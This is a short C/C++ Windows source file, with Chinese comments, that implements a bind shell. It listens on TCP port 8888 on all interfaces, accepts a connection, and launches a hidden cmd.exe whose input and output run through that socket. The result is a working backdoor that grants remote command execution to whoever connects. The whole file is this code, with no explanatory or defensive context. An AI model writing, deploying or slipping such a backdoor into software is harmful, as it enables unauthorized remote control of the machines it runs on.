#define _WINSOCK_DEPRECATED_NO_WARNINGS 1 
#include <winsock2.h>
#include<Windows.h>
#pragma comment(lib,"ws2_32.lib")
int main1()
{
	//初始化网络环境
	WSADATA wsaData{};
	int result = WSAStartup(0x0202, &wsaData);
	SOCKET socket = INVALID_SOCKET;
	socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	SOCKADDR_IN serverAddr;
	serverAddr.sin_addr.S_un.S_addr = INADDR_ANY;
	serverAddr.sin_port = htons(8888);
	serverAddr.sin_family = AF_INET;
	bind(socket, (LPSOCKADDR)&serverAddr, sizeof(SOCKADDR_IN));
	listen(socket, 0X7FFFFFFF);
	socket = accept(socket, 0, 0);
	PROCESS_INFORMATION pinfo{}; //2230
	STARTUPINFOA sinfo{}; //2300
	sinfo.cb = sizeof(STARTUPINFOA);
	sinfo.wShowWindow = SW_HIDE;
	sinfo.dwFlags = STARTF_USESTDHANDLES;
	sinfo.hStdInput = (HANDLE)socket;
	sinfo.hStdOutput = (HANDLE)socket;
	sinfo.hStdError = (HANDLE)socket;
	BOOL isSucess = CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, TRUE, 0, 0, 0, &sinfo, &pinfo);
	//关闭句柄释放资源
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	closesocket(socket);
	WSACleanup();
	return 0;
}